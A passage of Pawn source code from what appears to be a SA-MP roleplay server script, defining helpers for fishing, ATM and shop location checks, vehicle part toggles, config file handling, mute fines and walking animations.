	Float:bbPosZ,
	bbInt,
	bbVW,
	bbStation,
	bbSetBy,
	bbObject,
};
new BoomboxInfo[MAX_PLAYERS][bbInfo];


new BuddyInvite[MAX_PLAYERS];
new BuddyTimer[MAX_PLAYERS];


new OneSeatVehicles[38] =
{
    425, 430, 432, 441, 446, 448, 452, 453,
	454, 464, 465, 472, 473, 476, 481, 484,
	485, 486, 493, 501, 509, 510, 519, 520,
	530, 531, 532, 539, 553, 564, 568, 571,
	572, 574, 583, 592, 594, 595
};

stock FishCost(playerid, fish)
{
	if(IsPlayerConnected(playerid)) {
		new cost = 0;
		switch (fish)
		{
			case 1:
			{
				cost = 1;
			}
			case 2:
			{
				cost = 1;
			}
			case 3:
			{
				cost = 1;
			}
			case 5:
			{
				cost = 5;
			}
			case 6:
			{
				cost = 2;
			}
			case 8:
			{
				cost = 8;
			}
			case 9:
			{
				cost = 12;
			}
			case 11:
			{
				cost = 9;
			}
			case 12:
			{
				cost = 7;
			}
			case 14:
			{
				cost = 12;
			}
			case 15:
			{
				cost = 9;
			}
			case 16:
			{
				cost = 7;
			}
			case 17:
			{
				cost = 7;
			}
			case 18:
			{
				cost = 10;
			}
			case 19:
			{
				cost = 4;
			}
			case 21:
			{
				cost = 3;
			}
		}
		return cost;
	}
	return 0;
}

stock ClearFishes(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		Fishes[playerid][pFid1] = 0; Fishes[playerid][pFid2] = 0; Fishes[playerid][pFid3] = 0;
		Fishes[playerid][pFid4] = 0; Fishes[playerid][pFid5] = 0;
		Fishes[playerid][pWeight1] = 0; Fishes[playerid][pWeight2] = 0; Fishes[playerid][pWeight3] = 0;
		Fishes[playerid][pWeight4] = 0; Fishes[playerid][pWeight5] = 0;

		new string[MAX_PLAYER_NAME];
		format(string, sizeof(string), "None");
		strmid(Fishes[playerid][pFish1], string, 0, strlen(string), 255);
		strmid(Fishes[playerid][pFish2], string, 0, strlen(string), 255);
		strmid(Fishes[playerid][pFish3], string, 0, strlen(string), 255);
		strmid(Fishes[playerid][pFish4], string, 0, strlen(string), 255);
		strmid(Fishes[playerid][pFish5], string, 0, strlen(string), 255);
	}
	return 1;
}

stock ClearFishID(playerid, fish)
{
	if(IsPlayerConnected(playerid))
	{
		new string[MAX_PLAYER_NAME];
		format(string, sizeof(string), "None");
		switch (fish)
		{
			case 1:
			{
				strmid(Fishes[playerid][pFish1], string, 0, strlen(string), 255);
				Fishes[playerid][pWeight1] = 0;
				Fishes[playerid][pFid1] = 0;
			}
			case 2:
			{
				strmid(Fishes[playerid][pFish2], string, 0, strlen(string), 255);
				Fishes[playerid][pWeight2] = 0;
				Fishes[playerid][pFid2] = 0;
			}
			case 3:
			{
				strmid(Fishes[playerid][pFish3], string, 0, strlen(string), 255);
				Fishes[playerid][pWeight3] = 0;
				Fishes[playerid][pFid3] = 0;
			}
			case 4:
			{
				strmid(Fishes[playerid][pFish4], string, 0, strlen(string), 255);
				Fishes[playerid][pWeight4] = 0;
				Fishes[playerid][pFid4] = 0;
			}
			case 5:
			{
				strmid(Fishes[playerid][pFish5], string, 0, strlen(string), 255);
				Fishes[playerid][pWeight5] = 0;
				Fishes[playerid][pFid5] = 0;
			}
		}
	}
	return 1;
}

stock PlayerPlayMusic(playerid)
{
	if(IsPlayerConnected(playerid)) {
		SetTimer("StopMusic", 5000, 0);
		PlayerPlaySound(playerid, 1068, 0.0, 0.0, 0.0);
	}
}

forward StopMusic();
public StopMusic()
{
	foreach(Player, i)
	{
		PlayerPlaySound(i, 1069, 0.0, 0.0, 0.0);
	}
}

stock PlayerFixRadio(playerid)
{
	if(IsPlayerConnected(playerid)) {
		SetTimer("PlayerFixRadio2", 1000, 0);
		PlayerPlaySound(playerid, 1068, 0.0, 0.0, 0.0);
		Fixr[playerid] = 1;
	}
}

forward PlayerFixRadio2();
public PlayerFixRadio2()
{
	foreach(Player, i)
	{
		if(Fixr[i])
		{
			PlayerPlaySound(i, 1069, 0.0, 0.0, 0.0);
			Fixr[i] = 0;
		}
	}
}

stock vehicle_lock_doors(vehicle) {

	new
		vParamArr[7];

	GetVehicleParamsEx(vehicle, vParamArr[0], vParamArr[1], vParamArr[2], vParamArr[3], vParamArr[4], vParamArr[5], vParamArr[6]);
	return SetVehicleParamsEx(vehicle, vParamArr[0], vParamArr[1], vParamArr[2], VEHICLE_PARAMS_ON, vParamArr[4], vParamArr[5], vParamArr[6]);
}

stock vehicle_unlock_doors(vehicle) {

	new
		vParamArr[7];

	GetVehicleParamsEx(vehicle, vParamArr[0], vParamArr[1], vParamArr[2], vParamArr[3], vParamArr[4], vParamArr[5], vParamArr[6]);
	return SetVehicleParamsEx(vehicle, vParamArr[0], vParamArr[1], vParamArr[2], VEHICLE_PARAMS_OFF, vParamArr[4], vParamArr[5], vParamArr[6]);
}

stock IsSeatAvailable(vehicleid, seat)
{
	new carmodel = GetVehicleModel(vehicleid);
	for (new i = 0; i < sizeof(OneSeatVehicles); i++)
	{
	    if(carmodel == OneSeatVehicles[i]) return 0;
	}
	foreach(Player, i)
	{
	    if(GetPlayerVehicleID(i) == vehicleid && GetPlayerVehicleSeat(i) == seat) return 0;
	}
	return 1;
}

stock IsPlayerInInvalidNosVehicle(playerid)
{
	switch(GetVehicleModel(GetPlayerVehicleID(playerid))) {
		case 581, 523, 462, 521, 463, 522, 461, 448, 468, 586, 509, 481, 510, 472, 473, 493, 595, 484, 430, 453, 452, 446, 454, 590, 569, 537, 538, 570, 449: return 1;
	}
	return 0;
}

stock IsAtFishPlace(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid,1.0,403.8266,-2088.7598,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,398.7553,-2088.7490,7.8359))
		{//Fishplace at the bigwheel
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,1.0,396.2197,-2088.6692,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,391.1094,-2088.7976,7.8359))
		{//Fishplace at the bigwheel
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,1.0,383.4157,-2088.7849,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,374.9598,-2088.7979,7.8359))
		{//Fishplace at the bigwheel
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,1.0,369.8107,-2088.7927,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,367.3637,-2088.7925,7.8359))
		{//Fishplace at the bigwheel
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,1.0,362.2244,-2088.7981,7.8359) || IsPlayerInRangeOfPoint(playerid,1.0,354.5382,-2088.7979,7.8359))
		{//Fishplace at the bigwheel
			return 1;
		}
	}
	return 0;
}

stock IsAtClothShop(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid,25.0,207.5627,-103.7291,1005.2578) || IsPlayerInRangeOfPoint(playerid,25.0,203.9068,-41.0728,1001.8047) || IsPlayerInRangeOfPoint(playerid,25.0,203.9068,-41.0728,1001.8047))
		{//Binco & Suburban
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,30.0,214.4470,-7.6471,1001.2109) || IsPlayerInRangeOfPoint(playerid,50.0,161.3765,-83.8416,1001.8047))
		{//Zip & Victim
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,5.0,202.6777,-163.0623,1000.5306))
		{//Diedier Sachs
		    return 1;
		}
	}
	return 0;
}

stock IsAtBar(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid,3.0,495.7801,-76.0305,998.7578) || IsPlayerInRangeOfPoint(playerid,3.0,499.9654,-20.2515,1000.6797) || IsPlayerInRangeOfPoint(playerid,9.0,1497.5735,-1811.6150,825.3397))
		{//In grove street bar (with girlfriend), and in Havanna
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,4.0,1215.9480,-13.3519,1000.9219) || IsPlayerInRangeOfPoint(playerid,10.0,-2658.9749,1407.4136,906.2734) || IsPlayerInRangeOfPoint(playerid,10.0,2155.3367,-97.3984,3.8308))
		{//PIG Pen
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,6.0,300.351287, 1030.323120, 1104.560058) || IsPlayerInRangeOfPoint(playerid,6.0,311.184661, 1011.819274, 1098.540039) || IsPlayerInRangeOfPoint(playerid,10.0,-1091.006958, 607.855773, 1116.507812))
		{// First two: Tableau Club - Last one: The Lubu Gentlemen's club
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,6.0,255.606887, 1086.537109, 5099.806152))
		{// Santa Maria Surfer's Lounge.
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,10.0,453.2437,-105.4000,999.5500) || IsPlayerInRangeOfPoint(playerid,10.0,1255.69, -791.76, 1085.38) ||
		IsPlayerInRangeOfPoint(playerid,10.0,2561.94, -1296.44, 1062.04) || IsPlayerInRangeOfPoint(playerid,10.0,1139.72, -3.96, 1000.67) ||
		IsPlayerInRangeOfPoint(playerid,10.0,1139.72, -3.96, 1000.67) || IsPlayerInRangeOfPoint(playerid, 10.0, 880.06, 1430.86, -82.34) ||
		IsPlayerInRangeOfPoint(playerid,10.0,499.96, -20.66, 1000.68))
		{
			//Bars
			return 1;
		}
	}
	return 0;
}

stock IsAtATM(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid,3.0,2065.439453125, -1897.5510253906, 13.19670009613) || IsPlayerInRangeOfPoint(playerid,3.0,1497.7467041016, -1749.8747558594, 15.088212013245) || IsPlayerInRangeOfPoint(playerid,3.0,2093.5124511719, -1359.5474853516, 23.62727355957) || IsPlayerInRangeOfPoint(playerid,3.0,1155.6235351563, -1464.9141845703, 15.44321346283))
		{//ATMS
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,2139.4487304688, -1164.0811767578, 23.63508605957) || IsPlayerInRangeOfPoint(playerid,3.0,387.16552734375, -1816.0512695313, 7.4834146499634))
		{//ATMS
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,-24.385023117065, -92.001075744629, 1003.1897583008) || IsPlayerInRangeOfPoint(playerid,3.0,-31.811220169067, -58.106018066406, 1003.1897583008) || IsPlayerInRangeOfPoint(playerid,3.0,1212.7785644531, 2.451762676239, 1000.5647583008) || IsPlayerInRangeOfPoint(playerid,3.0,2324.4028320313, -1644.9445800781, 14.469946861267))
		{//ATMS
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,2228.39, -1707.78, 13.25) || IsPlayerInRangeOfPoint(playerid,3.0,651.19305419922, -520.48815917969, 15.978837013245) || IsPlayerInRangeOfPoint(playerid, 3.0, 45.78035736084, -291.80926513672, 1.5024013519287) || IsPlayerInRangeOfPoint(playerid,3.0,1275.7958984375, 368.31481933594, 19.19758605957) || IsPlayerInRangeOfPoint(playerid,3.0,2303.4577636719, -13.539554595947, 26.12727355957))/*End of Red County Random ATM's*/
		{//ATMS
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,691.08215332031, -618.5625, 15.978837013245) || IsPlayerInRangeOfPoint(playerid,3.0,173.23471069336, -155.07606506348, 1.2210245132446) || IsPlayerInRangeOfPoint(playerid,3.0,1260.8796386719, 209.30152893066, 19.19758605957) || IsPlayerInRangeOfPoint(playerid,3.0,2316.1015625, -88.522567749023, 26.12727355957))
		{//ATMS
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,2052.9246, -1660.6346, 13.1300) || IsPlayerInRangeOfPoint(playerid,3.0,-1980.6300,121.5300,27.3100))
		{
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,3.0,-2453.7600,754.8200,34.8000) || IsPlayerInRangeOfPoint(playerid,3.0,-2678.6201,-283.3400,6.8000))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,5.0,519.8157,-2890.8601,4.4609))
		{
		    return 1;
		}
		else if((IsPlayerInRangeOfPoint(playerid,5.0,487.060546, -2383.360107, 10.782341) && GetPlayerInterior(playerid) == 18))
		{ // Saints Mall
		    return 1;
		}
	}
	return 0;
}
stock SendVIPMessage(color, string[])
{
    foreach(Player, i) {
        if((PlayerInfo[i][pVip] >= 1 || PlayerInfo[i][pAdmin] >= 2) && GetPVarType(i, "togVIP")) {
            SendClientMessageEx(i, color, string);
        }
    }
}
// Anti Dialog ID spoofing
stock ShowPlayerDialogEx(playerid, dialogid, style, caption[], info[], button1[], button2[]) {
	SetPVarInt(playerid, "dialog", dialogid);
	ShowPlayerDialog(playerid, dialogid, style, caption, info, button1, button2);
	return 1;
}

stock IsAtNameChange(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0,1154.7295,-1440.2323,15.7969))
		{
			return 1;
		}
	}
	return 0;
}

stock IsAt247(playerid)
{
 	if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid, 100.0, -30.875, -88.9609, 1004.53))
		{
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 10.0, -2654.2300,1526.3693,907.1797))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, 890.66, 1429.08, -82.34))
		{
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, -29.2035, -185.1285, 1003.5469))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, 2.0450,-29.0116,1003.5494))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, -28.1463,-89.9533,1003.5469))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, -22.0699,-138.6297,1003.5469))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, -22.0699,-138.6297,1003.5469))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, -30.9772,-29.0228,1003.5573))
		{
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 50.0, -23.4488,-55.6319,1003.5469))
		{
		    return 1;
		}
		else if((IsPlayerInRangeOfPoint(playerid,130.0,470.430297, -2414.415527, 10.790462) && GetPlayerInterior(playerid) == 18))
		{ // Saints Mall
		    return 1;
		}
 	}
	return 0;
}

Float:GetDistanceBetweenPlayers(iPlayerOne, iPlayerTwo)
{
	new
		Float: fPlayerPos[3];

	GetPlayerPos(iPlayerOne, fPlayerPos[0], fPlayerPos[1], fPlayerPos[2]);
	return GetPlayerDistanceFromPoint(iPlayerTwo, fPlayerPos[0], fPlayerPos[1], fPlayerPos[2]);
}

stock RespawnNearbyVehicles(iPlayerID, Float: fRadius) {

	new
		Float: fPlayerPos[3];

    GetPlayerPos(iPlayerID, fPlayerPos[0], fPlayerPos[1], fPlayerPos[2]);
    for(new i = 1; i < MAX_VEHICLES; i++) if(GetVehicleModel(i) && GetVehicleDistanceFromPoint(i, fPlayerPos[0], fPlayerPos[1], fPlayerPos[2]) <= fRadius) {
		foreach(Player, x) if(GetPlayerVehicleID(x) == i) continue;
		SetVehicleToRespawn(i);
    }
	return 1;
}

stock DoubleEXPcheck(hour) {
    FixHour(hour);
    hour = shifthour;

	if(hour >= 13 && hour <= 15)
		return 1; // EU timezone
	else if(hour >= 18 && hour <= 20)
		return 1; // US timezone
    else if(hour >= 0 && hour <= 2)
		return 1; // OC timezone

	return 0;
}

stock Misc_Save() {

	new
		szFileStr[32],
		File: iFileHandle = fopen("serverConfig.ini", io_write);

	ini_SetInteger(iFileHandle, szFileStr, "Jackpot", Jackpot);
	ini_SetInteger(iFileHandle, szFileStr, "LoginCount", TotalLogin);
	ini_SetInteger(iFileHandle, szFileStr, "ConnCount", TotalConnect);
	ini_SetInteger(iFileHandle, szFileStr, "ABanCount", TotalAutoBan);
	ini_SetInteger(iFileHandle, szFileStr, "RegCount", TotalRegister);
	ini_SetInteger(iFileHandle, szFileStr, "MaxPCount", MaxPlayersConnected);
	ini_SetInteger(iFileHandle, szFileStr, "MaxPDay", MPDay);
	ini_SetInteger(iFileHandle, szFileStr, "MaxPMonth", MPMonth);
	ini_SetInteger(iFileHandle, szFileStr, "MaxPYear", MPYear);
	ini_SetInteger(iFileHandle, szFileStr, "Uptime", TotalUptime);
	ini_SetString(iFileHandle, "gMOTD", GlobalMOTD);
	ini_SetString(iFileHandle, "aMOTD", AdminMOTD);
	fclose(iFileHandle);
}

stock Misc_Load() {

	new
		szResult[32],
		szFileStr[160],
		File: iFileHandle = fopen("serverConfig.ini", io_read);

	while(fread(iFileHandle, szFileStr, sizeof(szFileStr))) {

		if(ini_GetValue(szFileStr, "gMOTD", GlobalMOTD, sizeof(GlobalMOTD))) 												continue;
		if(ini_GetValue(szFileStr, "aMOTD", AdminMOTD, sizeof(AdminMOTD))) 													continue;

		else if(ini_GetValue(szFileStr, "Jackpot", szResult, sizeof(szResult)))												Jackpot = strval(szResult);
		//else if(ini_GetValue(szFileStr, "Tax", szResult, sizeof(szResult)))													Tax = strval(szResult);
		//else if(ini_GetValue(szFileStr, "TaxVal", szResult, sizeof(szResult)))												TaxValue = strval(szResult);
		else if(ini_GetValue(szFileStr, "LoginCount", szResult, sizeof(szResult)))											TotalLogin = strval(szResult);
		else if(ini_GetValue(szFileStr, "ConnCount", szResult, sizeof(szResult)))											TotalConnect = strval(szResult);
		else if(ini_GetValue(szFileStr, "ABanCount", szResult, sizeof(szResult)))											TotalAutoBan = strval(szResult);
		else if(ini_GetValue(szFileStr, "RegCount", szResult, sizeof(szResult)))											TotalRegister = strval(szResult);
		else if(ini_GetValue(szFileStr, "MaxPCount", szResult, sizeof(szResult)))											MaxPlayersConnected	= strval(szResult);
		else if(ini_GetValue(szFileStr, "MaxPDay", szResult, sizeof(szResult)))												MPDay = strval(szResult);
		else if(ini_GetValue(szFileStr, "MaxPMonth", szResult, sizeof(szResult)))											MPMonth = strval(szResult);
		else if(ini_GetValue(szFileStr, "MaxPYear", szResult, sizeof(szResult)))											MPYear = strval(szResult);
		else if(ini_GetValue(szFileStr, "Uptime", szResult, sizeof(szResult)))												TotalUptime = strval(szResult);
	}
	fclose(iFileHandle);
}

ini_GetValue(szParse[], szValueName[], szDest[], iDestLen)
{

	new
		iPos = strfind(szParse, "=", false),
		iLength = strlen(szParse);

	while(iLength-- && szParse[iLength] <= ' ')
	{
		szParse[iLength] = 0;
	}

	if(strcmp(szParse, szValueName, false, iPos) == 0)
	{
		strmid(szDest, szParse, iPos + 1, iLength + 1, iDestLen);
		return 1;
	}
	return 0;
}

stock SetVehicleLights(vehicleid, playerid)
{
	new engine,lights,alarm,doors,bonnet,boot,objective;
    GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
    if(lights == VEHICLE_PARAMS_ON)
	{
		SetVehicleParamsEx(vehicleid,engine,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
		SendClientMessage(playerid, COLOR_WHITE, "Vehicle lights successfully turned off.");
	}
    else if(lights == VEHICLE_PARAMS_OFF || lights == VEHICLE_PARAMS_UNSET)
	{
		SetVehicleParamsEx(vehicleid,engine,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
		SendClientMessage(playerid, COLOR_WHITE, "Vehicle lights successfully turned on.");
	}
	return 1;
}

stock SetVehicleTrunk(vehicleid, playerid)
{
	new engine,lights,alarm,doors,bonnet,boot,objective;
    GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
    if(boot == VEHICLE_PARAMS_ON)
	{
		SetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_OFF,objective);
		SendClientMessage(playerid, COLOR_WHITE, "Vehicle trunk successfully closed.");
	}
    else if(boot == VEHICLE_PARAMS_OFF || boot == VEHICLE_PARAMS_UNSET)
	{
		SetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_ON,objective);
		SendClientMessage(playerid, COLOR_WHITE, "Vehicle trunk successfully opened.");
	}
	return 1;
}

stock SetVehicleHood(vehicleid, playerid)
{
	new engine,lights,alarm,doors,bonnet,boot,objective;
    GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
    if(bonnet == VEHICLE_PARAMS_ON)
	{
		SetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,VEHICLE_PARAMS_OFF,boot,objective);
		SendClientMessage(playerid, COLOR_WHITE, "Vehicle hood successfully closed.");
	}
    else if(bonnet == VEHICLE_PARAMS_OFF || bonnet == VEHICLE_PARAMS_UNSET)
	{
		SetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,VEHICLE_PARAMS_ON,boot,objective);
		SendClientMessage(playerid, COLOR_WHITE, "Vehicle hood successfully opened.");
	}
	return 1;
}

stock ShowNMuteFine(playerid)
{
	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));

	new allmoney;
	if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
	{
		allmoney = HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney]+GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
	}
	else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner], true) == 0)
	{
		allmoney += HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney];
	}
	else
	{
		allmoney = GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
	}

    new fine = 10*allmoney/100;
	if(PlayerInfo[playerid][pNMuteTotal] < 4)
	{
		new string[64];
		format(string,sizeof(string),"Prison for %d Minutes\nCash Fine ($%d)",PlayerInfo[playerid][pNMuteTotal] * 15, fine);
		ShowPlayerDialogEx(playerid,NMUTE,DIALOG_STYLE_LIST,"Newbie Chat Unmute - Select your Punishment:",string,"Select","Cancel");
	}
	else if(PlayerInfo[playerid][pNMuteTotal] == 4) ShowPlayerDialogEx(playerid,NMUTE,DIALOG_STYLE_LIST,"Newbie Chat Unmute - Select your Punishment:","Prison for 1 Hour","Select","Cancel");
	else if(PlayerInfo[playerid][pNMuteTotal] == 5) ShowPlayerDialogEx(playerid,NMUTE,DIALOG_STYLE_LIST,"Newbie Chat Unmute - Select your Punishment:","Prison for 1 Hour and 15 Minutes","Select","Cancel");
	else if(PlayerInfo[playerid][pNMuteTotal] == 6) ShowPlayerDialogEx(playerid,NMUTE,DIALOG_STYLE_LIST,"Newbie Chat Unmute - Select your Punishment:","Prison for 1 Hour and 30 Minutes","Select","Cancel");
}

stock ShowAdMuteFine(playerid)
{
	new string[128];
	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));

	new allmoney;
	if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
	{
		allmoney = HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney]+GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
	}
	else if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner], true) == 0)
	{
		allmoney += HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney];
	}
	else
	{
		allmoney = GetPlayerCash(playerid)+PlayerInfo[playerid][pBank];
	}

    new fine = 10*allmoney/100;
	if(PlayerInfo[playerid][pADMuteTotal] < 4)
	{
		format(string,sizeof(string),"Prison for %d Minutes\nCash Fine ($%d)",PlayerInfo[playerid][pADMuteTotal]*15,fine);
	}
	if(PlayerInfo[playerid][pADMuteTotal] == 4)
	{
	    format(string,sizeof(string),"Prison for 1 Hour");
	}
	if(PlayerInfo[playerid][pADMuteTotal] == 5)
	{
	    format(string,sizeof(string),"Prison for 1 Hour and 15 Minutes)");
	}
	if(PlayerInfo[playerid][pADMuteTotal] == 6)
	{
	    format(string,sizeof(string),"Prison for 1 Hour and 30 Minutes");
	}
	ShowPlayerDialogEx(playerid,ADMUTE,DIALOG_STYLE_LIST,"Advertisements Unmute - Select your Punishment:",string,"Select","Cancel");
}

stock FindFreeAttachedObjectSlot(playerid)
{
	new index;
 	while (index < MAX_PLAYER_ATTOBJECTS && IsPlayerAttachedObjectSlotUsed(playerid, index))
	{
		index++;
	}
	if(index == MAX_PLAYER_ATTOBJECTS) return -1;
	return index;
}

stock player_remove_vip_toys(iTargetID)
{
	if(PlayerInfo[iTargetID][pVip] >= 3) return 1;
	else for(new iToyIter; iToyIter < MAX_PLAYER_ATTOBJECTS; ++iToyIter) {
		for(new LoopRapist; LoopRapist < sizeof(HoldingObjectsCop); ++LoopRapist) {
			if(HoldingObjectsCop[LoopRapist][holdingmodelid] == PlayerToyInfo[iTargetID][iToyIter][ptModelID]) {
				new
					szQuery[128];

				SetPVarInt(iTargetID, "deleteObject", iToyIter);
				mysql_format(sqldb,szQuery, sizeof(szQuery), "DELETE FROM toys WHERE Owner = %d AND ID = %d", PlayerInfo[iTargetID][pID], PlayerToyInfo[iTargetID][iToyIter][ptRealID]);
				mysql_tquery(sqldb,szQuery,"OnQueryFinished","ii", THREAD_DELETE_PLAYER_OBJECT, iTargetID);
				if(IsPlayerAttachedObjectSlotUsed(iTargetID, iToyIter)) RemovePlayerAttachedObject(iTargetID, iToyIter);
			}
		}
	}
	SendClientMessage(iTargetID, COLOR_WHITE, "All accessories/toys that were property of your former employer have been removed.");
	return 1;
}

stock SetPlayerWalkingStyle(playerid, style)
{
	PlayerInfo[playerid][pWalkStyle] = style;
}

stock GetPlayerWalkingStyle(playerid)
{
	return PlayerInfo[playerid][pWalkStyle];
}

forward WalkAnim(playerid);
public WalkAnim(playerid)
{
	new keys, updown, leftright;
	GetPlayerKeys(playerid,keys,updown,leftright);
	if (GetPlayerWalkingStyle(playerid) == WALK_NORMAL)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_player",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_player",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_PED)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_civi",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_civi",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
 	else if (GetPlayerWalkingStyle(playerid) == WALK_GANGSTA)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_gang1",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_gang1",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_GANGSTA2)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_gang2",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_gang2",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_OLD)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_old",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_old",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
	}
	else if (GetPlayerWalkingStyle(playerid) == WALK_FAT_OLD)
	{
 	 	if ((keys & KEY_WALK && updown & KEY_UP) || (keys & KEY_WALK && updown & KEY_DOWN) || (keys & KEY_WALK && leftright & KEY_LEFT) || (keys & KEY_WALK && leftright & KEY_RIGHT))
		{
		   	KillTimer(walktime[playerid]);
			ApplyAnimation(playerid,"PED","WALK_fatold",4.1,1,1,1,1,1);
			walktime[playerid] = SetTimerEx("WalkAnim",200,0,"d",playerid);
		}
		else ApplyAnimation(playerid,"PED","WALK_fatold",4.0,0,0,0,0,1), KillTimer(walktime[playerid]);
